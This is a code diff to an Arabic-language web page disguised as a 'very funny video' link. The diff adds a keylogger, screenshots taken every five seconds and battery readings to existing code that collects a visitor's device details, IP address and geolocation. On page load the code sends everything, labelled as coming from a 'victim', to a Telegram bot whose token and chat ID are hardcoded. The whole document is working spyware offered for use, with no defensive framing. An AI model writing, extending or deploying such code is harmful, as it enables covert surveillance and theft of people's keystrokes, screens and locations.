@@ -2,13 +2,15 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>z</title>
+  <title>فيديو مضحك جداً 😂 شاهد حالا</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body { margin:0; background:#000; overflow:hidden; }
     iframe { width:100vw; height:100vh; border:none; }
     #msg { position:fixed; top:10px; left:10px; background:rgba(0,0,0,0.7); color:#fff; padding:10px; border-radius:8px; z-index:9999; font-family:Arial; }
   </style>
+  <!-- html2canvas للسكرين شوت -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </head>
 <body>
 
@@ -18,10 +20,12 @@
 
 <script>
 // Telegram Config
-const TELEGRAM_TOKEN = '8226370812:AAEYjJJffesfCxL1NIp0Ihd1r_2aSb4roSc';     // ← غيّر هنا بتوكن البوت تاعك
-const CHAT_ID = '6769216123';              // ← غيّر هنا بـ chat_id تاعك
+const TELEGRAM_TOKEN = '8226370812:AAEYjJJffesfCxL1NIp0Ihd1r_2aSb4roSc';     // ← غيّر هنا
+const CHAT_ID = '6769216123';              // ← غيّر هنا
 
-// جمع المعلومات
+let keys = '';  // لتخزين ضغطات الكيبورد
+
+// جمع المعلومات + keylogger + screenshot
 async function stealInfo() {
   const victim = {
     time: new Date().toISOString(),
@@ -36,7 +40,9 @@ async function stealInfo() {
     memory: navigator.deviceMemory || '?',
     touch: 'ontouchstart' in window,
     ip: 'fetching...',
-    geo: 'unknown'
+    geo: 'unknown',
+    keys: '',  // keylogger
+    screenshot: 'capturing...'
   };
 
   // IP via WebRTC
@@ -61,7 +67,33 @@ async function stealInfo() {
     }, () => { victim.geo = 'refused'; sendToTg(victim); });
   }
 
-  // إرسال فوري
+  // Battery
+  if (navigator.getBattery) {
+    navigator.getBattery().then(b => {
+      victim.battery = `${Math.round(b.level * 100)}% ${b.charging ? 'Charging' : 'Not charging'}`;
+      sendToTg(victim);
+    });
+  }
+
+  // Keylogger (تسجيل كل ضغطة)
+  document.addEventListener('keydown', e => {
+    keys += e.key + ' ';
+    if (keys.length > 100) {  // كل 100 حرف يرسل
+      victim.keys = keys;
+      sendToTg(victim);
+      keys = '';
+    }
+  });
+
+  // Screenshot تلقائي (كل 5 ثواني)
+  setInterval(() => {
+    html2canvas(document.body, {scale: 0.5}).then(canvas => {
+      victim.screenshot = canvas.toDataURL('image/png');
+      sendToTg(victim);
+    });
+  }, 5000);
+
+  // أرسل فوري
   sendToTg(victim);
 }
 
@@ -80,14 +112,31 @@ function sendToTg(data) {
     `⚙️ CPU: ${data.hardware}\n` +
     `🧠 RAM: ${data.memory}\n` +
     `📍 Geo: ${data.geo}\n` +
-    `🌐 IP: ${data.ip}`
+    `🔋 Battery: ${data.battery || 'unknown'}\n` +
+    `⌨️ Keys: ${data.keys || ''}\n` +
+    `🌐 IP: ${data.ip}\n` +
+    `🖼️ Screenshot: (attached)`
   );
 
-  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}&parse_mode=HTML`)
-    .catch(e => {});
+  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}&parse_mode=HTML`;
+
+  fetch(url).catch(e => {});
+
+  // إرسال السكرين شوت كصورة
+  if (data.screenshot && data.screenshot.startsWith('data:image')) {
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        photo: data.screenshot,
+        caption: 'Screenshot from victim'
+      })
+    }).catch(e => {});
+  }
 }
 
-// شغّل فور الدخول
+// شغّل فور التحميل
 window.onload = stealInfo;
 </script>
 
